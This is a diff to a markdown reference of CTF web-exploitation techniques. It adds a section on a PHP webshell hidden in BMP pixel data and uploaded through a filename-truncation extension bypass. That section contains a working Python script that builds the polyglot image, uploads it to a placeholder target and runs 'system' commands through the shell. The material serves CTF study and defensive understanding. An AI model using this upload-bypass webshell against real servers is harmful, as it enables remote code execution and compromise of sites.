@@ -10,6 +10,7 @@
 - [Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)](#wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016)
 - [Tar Filename Command Injection (CyberSecurityRumble 2016)](#tar-filename-command-injection-cybersecurityrumble-2016)
 - [PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)](#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026)
+- [PHP BMP Pixel Webshell with Filename Truncation (Nuit du Hack CTF 2018)](#php-bmp-pixel-webshell-with-filename-truncation-nuit-du-hack-ctf-2018)
 - [Editor Backup File Source Disclosure (h4ckc0n 2017)](#editor-backup-file-source-disclosure-h4ckc0n-2017)
 - [date -f Arbitrary File Read (Can-CWIC 2017)](#date--f-arbitrary-file-read-can-cwic-2017)
 - [Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)](#apache-mod_rewrite-path_info-bypass-ekoparty-2017)
@@ -18,7 +19,7 @@
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
-- [Race Conditions (TOCTOU)](#race-conditions-toctou) *(stub — see [server-side-deser.md](server-side-deser.md))*
+- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use) *(stub — see [server-side-deser.md](server-side-deser.md))*
 
 For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion), see [server-side.md](server-side.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
@@ -134,7 +135,7 @@ Serialized Java objects in cookies/POST (starts with `rO0AB` / `aced0005`). Use 
 
 ---
 
-## Race Conditions (TOCTOU)
+## Race Conditions (Time-of-Check to Time-of-Use)
 
 Concurrent requests bypass check-then-act patterns (balance, coupons, registration uniqueness). Send 50+ simultaneous requests so all see pre-modification state. See [server-side-deser.md](server-side-deser.md#race-conditions-toctou) for async exploit code and detection patterns.
 
@@ -317,6 +318,80 @@ ini_get('disable_functions');
 **When to recognize:** File upload challenge with image-only restrictions. Check `phpinfo()` output for `disable_functions` list. If all exec functions are blocked, pivot to pure PHP filesystem functions.
 
 **References:** MetaCTF Flash CTF 2026 "Brand Kit"
+
+---
+
+### PHP BMP Pixel Webshell with Filename Truncation (Nuit du Hack CTF 2018)
+
+**Pattern:** Encode PHP code as BMP pixel colors (BGR format). The server validates the file extension (e.g., requires `.JPG` or `.BMP`) but truncates filenames to a maximum length. Craft a filename like `'A'*46 + '.php.JPG'` that passes the `.JPG` extension check but truncates to `'A'*46 + '.php'` at the 50-character limit.
+
+**How BMP pixel encoding works:**
+```python
+import struct
+import requests
+
+# BMP files store pixel data as raw bytes in BGR order (Blue, Green, Red)
+# PHP ignores non-PHP content before <?php tags
+# So embedding PHP code in pixel color values creates a valid BMP that is also valid PHP
+
+payload = "<?php @$_GET[a]($_GET[b]);?>"
+
+def pad(s, block=3):
+    """Pad payload to multiple of 3 bytes (one pixel = 3 color bytes)."""
+    while len(s) % block != 0:
+        s += " "
+    return s
+
+def chunk(s, n):
+    """Split string into n-byte chunks."""
+    return [s[i:i+n] for i in range(0, len(s), n)]
+
+# Read a template BMP file (small valid BMP, e.g., 10x10)
+with open("template.bmp", "rb") as f:
+    data = bytearray(f.read())
+
+# Find the pixel data offset (stored at byte 10-13 in BMP header)
+pixel_offset = struct.unpack_from('<I', data, 10)[0]
+
+# Encode PHP payload as BMP pixel colors
+padded = pad(payload)
+index = pixel_offset
+for c in chunk(padded, 3):
+    data[index + 2] = ord(c[0])  # R -> B in BMP format (BGR order)
+    data[index + 1] = ord(c[1])  # G stays
+    data[index] = ord(c[2])      # B -> R in BMP format
+    index += 4  # skip alpha byte (if 32-bit BMP) or use 3 for 24-bit
+
+# Filename truncation exploit:
+# Server checks extension: must end with .JPG or .BMP
+# Server truncates filename to 50 chars
+# "A" * 46 + ".php" = 50 chars (after truncation)
+# "A" * 46 + ".php" + ".JPG" = 54 chars (passes extension check before truncation)
+name = "A" * 46 + ".php"
+
+# Upload with the extension that passes validation
+requests.post(
+    "http://target/upload",
+    data={"data": str(list(data)), "name": name + ".JPG", "format": "BMP"}
+)
+
+# Access the webshell (filename truncated to .php)
+r = requests.get(f"http://target/uploads/{name}", params={"a": "system", "b": "cat /flag.txt"})
+print(r.text)
+```
+
+**Filename truncation variants:**
+```text
+# 50-char limit example:
+"A"*46 + ".php" + ".JPG"     -> truncated to "A"*46 + ".php"  (50 chars)
+"A"*46 + ".php" + ".png"     -> truncated to "A"*46 + ".php"  (50 chars)
+
+# Other truncation lengths — adjust padding:
+# For N-char limit: "A"*(N-4) + ".php" + ".ext"
+# The ".ext" passes the extension check, then gets truncated away
+```
+
+**Key insight:** BMP files store pixel data as raw bytes in BGR order. PHP ignores non-PHP content before `<?php` tags. When the server truncates filenames to a fixed length, `'A'*46 + '.php' + '.JPG'` passes extension validation but saves as `.php`. This combines three bypass techniques: (1) polyglot file format (valid BMP + valid PHP), (2) extension check evasion via filename truncation, (3) webshell hidden in image pixel data survives re-encoding unless the server re-renders the image from scratch.
 
 ---
 
